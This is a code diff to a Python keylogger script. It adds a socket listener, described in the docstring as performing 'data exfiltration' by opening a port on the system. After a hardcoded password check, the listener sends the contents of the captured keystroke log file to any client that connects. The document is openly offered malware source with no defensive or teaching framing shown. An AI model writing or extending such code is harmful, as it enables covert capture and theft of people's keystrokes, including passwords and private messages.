@@ -2,6 +2,7 @@
 import keyboard
 import time
 import threading
+import socket
 
 
 '''
@@ -39,8 +40,30 @@ class Keylogger:
         Perform data exfiltration
         Open a port on the system 
 
-        !use sockets
+        wait for a connection
+
         '''
+        PORT = 8865
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(('127.0.0.1', PORT))
+        s.listen()
+
+        while True:
+            print('listening')
+            client, addr = s.accept()
+            print(f'connection received from {addr}')
+
+            password = client.recv(1024).decode()
+            if password != 'bad_password!@#PQWERD':
+                exit()
+
+            with open('key_logs.txt') as logfile:
+                data = logfile.readlines()
+                buf_size = len(data)
+
+            client.send(str(buf_size).encode())
+            client.send(str(data).encode())
 
 
 Keylogger()
